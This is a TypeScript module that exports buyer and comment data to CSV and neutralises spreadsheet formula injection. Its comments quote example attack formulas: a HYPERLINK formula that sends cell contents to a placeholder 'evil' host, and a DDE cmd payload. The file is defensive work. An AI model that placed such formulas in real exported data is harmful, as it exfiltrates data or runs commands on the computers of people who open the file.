// Phase 5j — CSV export. The serializer began as a VERBATIM copy of App.tsx:280-282
// (csvDL); it now adds CSV-injection neutralization (see below), so it is byte-identical
// to production for CLEAN data but DELIBERATELY diverges for cells that begin with a
// formula trigger. Pure `toCSV` is unit-tested; `csvDL` adds the browser download.
// Client-side only — exports already-loaded real data, no new backend/query.

// CSV formula / DDE injection neutralization (CWE-1236 / OWASP "CSV Injection").
// Buyer names, @handles, and comment text are attacker-controlled — ANY TikTok live
// viewer can set them. A spreadsheet app (Excel / Sheets / Calc) evaluates any cell
// whose value STARTS with a formula trigger, so `=HYPERLINK("http://evil?"&A1,"x")`
// exfiltrates on open (and legacy `=cmd|'/C ...'!A0` runs DDE). Fix = prepend a single
// apostrophe to any cell starting with a trigger char: the OWASP-endorsed, render-only
// neutralization (the underlying value is PRESERVED — only its display is forced to
// text). Quoting is NOT a defense: Excel strips the surrounding quotes and still
// evaluates the leading `=`. Full-width variants (＝ ＋ － ＠) are included because our
// buyers are CJK/Asian. Applied to every cell (headers are constants → no-op on them).
const CSV_TRIGGERS = "=+-@\t\r\n＝＋－＠"; // = + - @ TAB CR LF ＝ ＋ － ＠
export function csvSafeCell(v: string | number): string {
  const s = String(v);
  return s && CSV_TRIGGERS.includes(s[0]) ? `'${s}` : s;
}

// Quote every cell + escape quotes (verbatim from App.tsx:281), after formula-trigger
// neutralization of each cell value.
export function toCSV(headers: string[], rows: (string | number)[][]): string {
  return [headers, ...rows]
    .map((r) => r.map((c) => `"${csvSafeCell(c).replace(/"/g, '""')}"`).join(","))
    .join("\n");
}

export function csvDL(filename: string, headers: string[], rows: (string | number)[][]): void {
  const csv = toCSV(headers, rows);
  const a = document.createElement("a");
  a.href = URL.createObjectURL(new Blob([csv], { type: "text/csv" }));
  a.download = filename;
  a.click();
}

// Today's date stamp for filenames (matches production's `new Date().toISOString().slice(0,10)`).
export const dayStamp = (): string => new Date().toISOString().slice(0, 10);
